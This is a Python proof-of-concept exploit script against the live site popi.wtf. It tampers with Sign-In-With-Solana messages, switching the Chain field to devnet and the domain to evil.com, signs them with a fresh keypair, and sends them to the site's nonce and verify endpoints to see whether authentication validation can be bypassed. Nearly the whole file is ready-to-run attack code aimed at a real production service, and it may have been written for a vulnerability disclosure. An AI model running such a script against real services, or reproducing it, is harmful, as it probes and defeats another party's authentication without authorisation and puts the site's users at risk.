#!/usr/bin/env python3
"""
PoC: popi.wtf SIWS chain confusion + domain non-validation

The /api/auth/verify endpoint accepts SIWS messages with:
  - Modified Chain field (mainnet-beta → devnet): ACCEPTED
  - Modified domain field (popi.wtf → evil.com): ACCEPTED
  - Modified URI field: REJECTED (correctly)
  - Modified wallet: REJECTED (correctly)

The server validates nonce, signature, and URI, but does NOT validate
the Chain or domain fields against the issued nonce.

Run: python3 poc_siws_chain_confusion.py
Requires: solders, base58
"""
import json
import re
import time
import urllib.request
import urllib.error
from solders.keypair import Keypair
import base58

BASE = "https://popi.wtf"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"


def http_post(path, body):
    url = f"{BASE}{path}"
    data = json.dumps(body).encode()
    headers = {"Content-Type": "application/json", "User-Agent": UA, "Origin": BASE}
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req) as resp:
            raw = resp.read()
            return resp.status, json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            return e.code, json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            return e.code, {"raw": raw.decode("utf-8", errors="replace")[:200]}


def sign_message(keypair, message):
    sig = keypair.sign_message(message.encode())
    return base58.b58encode(bytes(sig)).decode()


def main():
    print("=" * 60)
    print("PoC: popi.wtf SIWS chain confusion + domain non-validation")
    print("=" * 60)

    kp = Keypair()
    wallet = str(kp.pubkey())
    print(f"\nWallet: {wallet}")

    # Get nonce (chainId: mainnet-beta)
    status, nonce_body = http_post("/api/auth/nonce", {
        "wallet": wallet, "chainId": "mainnet-beta"
    })
    if "message" not in nonce_body:
        print(f"Nonce failed: {nonce_body}")
        return

    msg = nonce_body["message"]
    print(f"\nOriginal message:\n{msg}")

    # Test 1: Chain confusion (mainnet-beta → devnet)
    print("\n[1] Chain confusion: mainnet-beta → devnet")
    msg_devnet = re.sub(r"Chain: .+", "Chain: devnet", msg)
    sig1 = sign_message(kp, msg_devnet)
    status1, body1 = http_post("/api/auth/verify", {
        "wallet": wallet, "message": msg_devnet, "signature": sig1
    })
    print(f"  Status: {status1}")
    print(f"  Body: {body1}")
    print(f"  Result: {'BYPASSED' if status1 == 200 else 'BLOCKED'}")

    # Test 2: Domain non-validation (popi.wtf → evil.com)
    print("\n[2] Domain non-validation: popi.wtf → evil.com")
    # Need fresh nonce (previous was consumed)
    time.sleep(1)
    status, nonce_body2 = http_post("/api/auth/nonce", {
        "wallet": wallet, "chainId": "mainnet-beta"
    })
    if "message" not in nonce_body2:
        print(f"  Nonce failed: {nonce_body2}")
    else:
        msg2 = nonce_body2["message"]
        msg_evil = re.sub(r"^.+ wants you", "evil.com wants you", msg2)
        sig2 = sign_message(kp, msg_evil)
        status2, body2 = http_post("/api/auth/verify", {
            "wallet": wallet, "message": msg_evil, "signature": sig2
        })
        print(f"  Status: {status2}")
        print(f"  Body: {body2}")
        print(f"  Result: {'BYPASSED' if status2 == 200 else 'BLOCKED'}")

    # Test 3: URI validation (should be blocked)
    print("\n[3] URI validation: https://popi.wtf → https://evil.com")
    time.sleep(1)
    status, nonce_body3 = http_post("/api/auth/nonce", {
        "wallet": wallet, "chainId": "mainnet-beta"
    })
    if "message" not in nonce_body3:
        print(f"  Nonce failed: {nonce_body3}")
    else:
        msg3 = nonce_body3["message"]
        msg_uri_evil = re.sub(r"URI: .+", "URI: https://evil.com", msg3)
        sig3 = sign_message(kp, msg_uri_evil)
        status3, body3 = http_post("/api/auth/verify", {
            "wallet": wallet, "message": msg_uri_evil, "signature": sig3
        })
        print(f"  Status: {status3}")
        print(f"  Body: {body3}")
        print(f"  Result: {'BYPASSED' if status3 == 200 else 'BLOCKED (correct)'}")

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print("  Chain field: NOT validated (devnet accepted for mainnet nonce)")
    print("  Domain field: NOT validated (evil.com accepted)")
    print("  URI field: validated (evil.com rejected)")
    print("  Nonce: single-use ✅")
    print("  Signature: validated ✅")
    print("=" * 60)


if __name__ == "__main__":
    main()
